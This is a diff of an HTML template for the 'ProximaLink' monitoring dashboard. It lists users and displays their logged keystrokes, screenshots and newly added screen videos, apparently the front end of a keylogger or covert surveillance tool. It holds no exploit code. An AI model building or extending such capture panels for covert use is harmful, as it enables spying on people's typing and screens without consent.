@@ -5,6 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ProximaLink Dashboard</title>
     <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <link
       rel="stylesheet"
       href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
     />
@@ -20,7 +33,8 @@
     </header>
     <div class="container-fluid">
       <div class="row">
-        <aside class="col-md-2 bg-light text-dark py-3">
+        <!-- Aside Section -->
+        <aside class="col-md-2 py-3">
           <h2>Users</h2>
           <ul class="list-unstyled">
             {% if unique_users %} {% for user in unique_users %}
@@ -30,48 +44,104 @@
             {% endif %}
           </ul>
         </aside>
-        <main class="col-md-10 py-3">
-          <div class="d-flex justify-content-between mb-3">
-            <button id="toggleKeylogs" class="btn btn-primary">Keylogs</button>
-            <button id="toggleScreenshots" class="btn btn-secondary">
-              Screenshots
-            </button>
+
+        <!-- Main Section -->
+        <main class="col-md-10">
+          <div class="row mb-3">
+            <div class="col">
+              <!-- Buttons Section -->
+              <div
+                class="btn-group mb-2"
+                role="group"
+                aria-label="Toggle Buttons"
+              >
+                <button
+                  type="button"
+                  class="btn btn-primary"
+                  id="btnKeystrokes"
+                >
+                  Keystrokes
+                </button>
+                <button
+                  type="button"
+                  class="btn btn-primary"
+                  id="btnScreenshots"
+                >
+                  Screenshots
+                </button>
+                <button type="button" class="btn btn-primary" id="btnVideos">
+                  Videos
+                </button>
+              </div>
+            </div>
           </div>
-          <div id="keylogsSection">
-            {% if all_logs %}
-            <div class="row row-data">
+
+          <!-- Content Sections -->
+          <div class="row">
+            <div class="col">
+              <!-- Keystrokes Section -->
+              {% if all_logs %}
               {% for log in all_logs %}
-              <div class="col-md-8 log-entry my-2 p-2 border rounded">
+              <div class="log-entry border rounded mb-3">
                 <p>{{ log.text }}</p>
                 <p class="timestamp text-left">{{ log.timestamp }}</p>
               </div>
-              {% endfor %}
-            </div>
-            {% else %}
-            <div class="alert alert-info text-center" role="alert">
-              No logs found yet. Monitor activity for data to appear.
-            </div>
-            {% endif %}
-          </div>
-          <div id="screenshotsSection" style="display: none">
-            <div class="row">
-              {% for screenshot in screenshots %}
-              <div class="col-md-4 mb-4">
-                <img
-                  src="http://localhost:8000/{{ screenshot.image_path }}"
-                  alt="Screenshot"
-                  class="img-thumbnail"
-                  data-image="http://localhost:8000/{{ screenshot.image_path }}"
-                  data-toggle="modal"
-                  data-target="#overlayModal"
-                />
+              {% endfor %} {% else %}
+                <div class="alert alert-info text-center" role="alert">
+                  No keystrokes found.
+                </div>
+                {% endif %}
               </div>
-              {% endfor %}
+            </div>
+
+              <!-- Screenshots Section -->
+              <div
+                id="sectionScreenshots"
+                class="content-section"
+                style="display: none"
+              >
+                {% if screenshots %} {% for screenshot in screenshots %}
+                <div class="screenshot-entry mb-3">
+                  <img
+                    src="{{ screenshot.url }}"
+                    alt="Screenshot"
+                    class="img-fluid"
+                  />
+                  <p class="timestamp text-left">{{ screenshot.timestamp }}</p>
+                </div>
+                {% endfor %} {% else %}
+                <div class="alert alert-info text-center" role="alert">
+                  No screenshots found.
+                </div>
+                {% endif %}
+              </div>
+
+              <!-- Videos Section -->
+              <div
+                id="sectionVideos"
+                class="content-section"
+                style="display: none"
+              >
+                {% if videos %} {% for video in videos %}
+                <div class="video-entry mb-3">
+                  <video controls>
+                    <source src="{{ video.url }}" type="video/mp4" />
+                    Your browser does not support the video tag.
+                  </video>
+                  <p class="timestamp text-left">{{ video.timestamp }}</p>
+                </div>
+                {% endfor %} {% else %}
+                <div class="alert alert-info text-center" role="alert">
+                  No videos found.
+                </div>
+                {% endif %}
+              </div>
             </div>
           </div>
         </main>
       </div>
     </div>
+
     <footer class="bg-primary text-white text-center py-3 mt-3">
       <p>ProximaLink Monitoring &copy; 2024</p>
     </footer>
